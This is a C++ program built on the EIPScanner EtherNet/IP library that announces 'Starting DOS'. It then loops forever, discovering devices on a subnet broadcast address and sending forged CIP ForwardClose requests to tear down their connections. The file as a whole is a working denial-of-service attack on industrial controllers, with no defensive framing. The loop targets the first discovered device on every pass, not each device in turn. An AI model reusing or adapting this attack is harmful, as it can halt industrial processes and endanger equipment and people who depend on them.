//
// Created by Benjamin van Seggelen
//
#include <thread>
#include "utils/Logger.h"

#include "DiscoveryManager.h"
#include "SessionInfo.h"
#include "eip/EncapsPacket.h"
#include "eip/EncapsPacketFactory.h"
#include "ConnectionManager.h"
#include "MessageRouter.h"
#include "cip/connectionManager/ForwardCloseRequest.h"

using eipScanner::ConnectionManager;
using eipScanner::DiscoveryManager;
using eipScanner::IdentityItem;
using eipScanner::MessageRouter;
using eipScanner::SessionInfo;
using eipScanner::cip::connectionManager::ForwardCloseRequest;
using eipScanner::eip::EncapsPacket;
using eipScanner::eip::EncapsPacketFactory;
using eipScanner::utils::Logger;
using eipScanner::utils::LogLevel;

int main()
{
    Logger::setLogLevel(LogLevel::DEBUG);
    IdentityItem::Vec devices;

    std::this_thread::sleep_for(std::chrono::seconds(10));
    Logger(LogLevel::INFO) << "Starting DOS";

    while (true)
    {
        DiscoveryManager discoveryManager("172.28.255.255", 0xAF12, std::chrono::seconds(5));
        devices = discoveryManager.discover();

        for (const auto device : devices)
        {
            auto si = std::make_shared<SessionInfo>(devices.at(0).socketAddress.getHost(), 0xAF12);
            auto messageRouter = std::make_shared<MessageRouter>();

            ForwardCloseRequest request;
            request.setConnectionPath({0x20, 0x04, 0x24, 151, 0x2C, 150, 0x2C, 100});
            request.setOriginatorVendorId(342);
            request.setOriginatorSerialNumber(0x12345);
            request.setConnectionSerialNumber(1);

            auto messageRouterResponse = messageRouter->sendRequest(si,
                                                                    static_cast<eipScanner::cip::CipUsint>(0x4E),
                                                                    eipScanner::cip::EPath(6, 1), request.pack());

            if (messageRouterResponse.getGeneralStatusCode() != eipScanner::cip::GeneralStatusCodes::SUCCESS)
            {
                Logger(LogLevel::WARNING)
                    << "Failed to close the connection in target with error=0x"
                    << std::hex
                    << messageRouterResponse.getGeneralStatusCode()
                    << ". But the connection is removed from ConnectionManager anyway";

                eipScanner::cip::logGeneralAndAdditionalStatus(messageRouterResponse);
            }
        }
    }

    return EXIT_SUCCESS;
}